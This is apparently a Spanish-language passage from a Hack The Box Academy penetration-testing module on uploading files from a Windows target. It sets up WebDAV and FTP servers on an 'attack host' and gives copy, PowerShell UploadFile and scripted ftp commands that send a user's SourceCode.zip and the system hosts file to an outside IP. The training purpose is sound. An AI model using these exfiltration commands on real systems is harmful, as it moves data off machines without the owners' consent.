IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

```r
echo <base64> | base64 -d -w 0 > hosts
```

---

## SMB Uploads

Discutimos anteriormente que las empresas generalmente permiten tráfico saliente utilizando los protocolos `HTTP` (TCP/80) y `HTTPS` (TCP/443). Comúnmente, las empresas no permiten el protocolo SMB (TCP/445) fuera de su red interna porque esto puede abrirlas a posibles ataques. Para obtener más información sobre esto, podemos leer la publicación de Microsoft [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

Una alternativa es ejecutar SMB sobre HTTP con `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) es una extensión de HTTP, el protocolo de internet que los navegadores web y los servidores web utilizan para comunicarse entre sí. El protocolo `WebDAV` permite que un servidor web se comporte como un servidor de archivos, admitiendo la autoría colaborativa de contenido. `WebDAV` también puede usar HTTPS.

Cuando usas `SMB`, primero intentará conectarse utilizando el protocolo SMB, y si no hay un recurso compartido SMB disponible, intentará conectarse utilizando HTTP. En la siguiente captura de Wireshark, intentamos conectarnos al recurso compartido `testing3`, y como no encontró nada con `SMB`, utilizó `HTTP`.

![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)

### Configuring WebDav Server

Para configurar nuestro servidor WebDav, necesitamos instalar dos módulos de Python, `wsgidav` y `cheroot` (puedes leer más sobre esta implementación aquí: [wsgidav github](https://github.com/mar10/wsgidav)). Después de instalarlos, ejecutamos la aplicación `wsgidav` en el directorio de destino.

### Installing WebDav Python modules

```r
sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

### Using the WebDav Python module

```r
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

### Connecting to the Webdav Share

Ahora podemos intentar conectarnos al recurso compartido utilizando el directorio `DavWWWRoot`.

```r
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

**Nota:** `DavWWWRoot` es una palabra clave especial reconocida por el Shell de Windows. No existe tal carpeta en tu servidor WebDAV. La palabra clave DavWWWRoot le dice al controlador Mini-Redirector, que maneja las solicitudes de WebDAV, que te estás conectando a la raíz del servidor WebDAV.

Puedes evitar usar esta palabra clave si especificas una carpeta que exista en tu servidor al conectarte al servidor. Por ejemplo: \192.168.49.128\sharefolder

### Uploading Files using SMB

```r
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**Nota:** Si no hay restricciones de SMB (TCP/445), puedes usar impacket-smbserver de la misma manera en que lo configuramos para operaciones de descarga.

---

## FTP Uploads

Cargar archivos utilizando FTP es muy similar a descargar archivos. Podemos usar PowerShell o el cliente FTP para completar la operación. Antes de iniciar nuestro servidor FTP utilizando el módulo Python `pyftpdlib`, necesitamos especificar la opción `--write` para permitir que los clientes carguen archivos en nuestro host de ataque.

```r
sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Ahora usemos la función de carga de PowerShell para cargar un archivo en nuestro servidor FTP.

### PowerShell Upload File

```r
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Create a Command File for the FTP Client to Upload a File

```r
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---

## Recap

Discutimos varios métodos para descargar y cargar archivos utilizando herramientas nativas de Windows, pero hay más. En las secciones siguientes, discutiremos otros mecanismos y herramientas que podemos usar para realizar operaciones de transferencia de archivos.